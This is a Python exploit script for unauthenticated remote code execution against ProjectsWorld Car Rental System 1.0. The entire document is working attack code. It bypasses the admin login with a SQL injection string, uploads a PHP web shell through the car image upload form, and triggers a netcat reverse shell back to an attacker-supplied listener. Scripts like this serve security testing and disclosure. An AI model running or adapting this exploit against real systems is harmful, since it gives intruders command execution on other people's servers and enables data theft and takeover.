# Exploit Title: ProjectsWorld Car Rental System 1.0 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-12-25
# Exploit Author: Jeremiasz Pluta
# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/car-rental-project-in-php-and-mysql/
# Software Link: https://projectworlds.in/free-projects/php-projects/car-rental-project-in-php-and-mysql/
# Tested on: LAMP Stack (Debian 10)

#!/usr/bin/python
import sys
import re
import argparse
import requests
import time
import subprocess

print('Exploit for ProjectsWorld Car Rental System 1.0 - Remote Code Execution (Unauthenticated)')

path = '/CRS' #change me if the path to the application is in the root directory or another subdir

class Exploit:

	def __init__(self, target_ip, target_port, localhost, localport):
		self.target_ip = target_ip
		self.target_port = target_port
		self.localhost = localhost
		self.localport = localport

	def exploitation(self):
		sqli = """uname=admin%27+OR+%271%27%3D%271%27--+-&pass=ptakilatajakluczem&login=Login+Here"""
		payload = """<?php system($_GET['cmd']); ?>"""
		payload2 = """rm+/tmp/f%3bmknod+/tmp/f+p%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+""" + localhost + """+""" + localport + """+>/tmp/f"""

		#proxy = {'http':'http://127.0.0.1:8080'}

		url = 'http://' + target_ip + ':' + target_port + path
		r = requests.Session()

		print('[*] Resolving URL...')
		r1 = r.get(url + '/admin/', allow_redirects=True)
		time.sleep(3)

		#Bypass authentication with SQL Injection
		print('[*] Bypassing auth with SQL Injection...')
		r2 = r.post(url + '/login.php', data=sqli, allow_redirects=True)
		time.sleep(3)

		#Upload the payload file to vehicle addition page
		print('[*] Uploading the webshell payload...')
		files = {
		'image': ('cmd.php', payload + '\n', 'application/x-php')
		}
		data = {
		'car_name':'Polski Fiat 126p',
		'car_type':'City Car',
		'hire_cost':'1000000',
		'capacity':'8',
		'send':'submit'
		}
		r3 = r.post(url + '/admin/add_cars.php', files=files, allow_redirects=True, data=data)
		time.sleep(3)

		print('[*] Setting up netcat listener...')
		listener = subprocess.Popen(["nc", "-nvlp", self.localport])
		time.sleep(3)

		print('[*] Spawning reverse shell...')
		print('[*] Watchout!')
		r4 = r.get(url + '/cars/cmd.php?cmd=' + payload2)
		time.sleep(3)

		if (r3.status_code == 200):
			print('[*] Got shell!')
			while True:
				listener.wait()
		else:
			print('[-] Something went wrong!')
			listener.terminate()

def get_args():
	parser = argparse.ArgumentParser(description='ProjectsWorld Car Rental System 1.0 - Remote Code Execution (RCE) (Unauthenticated)')
	parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
	parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
	parser.add_argument('-L', '--listener-ip', dest="localhost", required=True, action='store', help='Local listening IP')
	parser.add_argument('-P', '--localport', dest="localport", required=True, action='store', help='Local listening port')
	args = parser.parse_args()
	return args

args = get_args()
target_ip = args.url
target_port = args.target_port
localhost = args.localhost
localport = args.localport

exp = Exploit(target_ip, target_port, localhost, localport)
exp.exploitation()
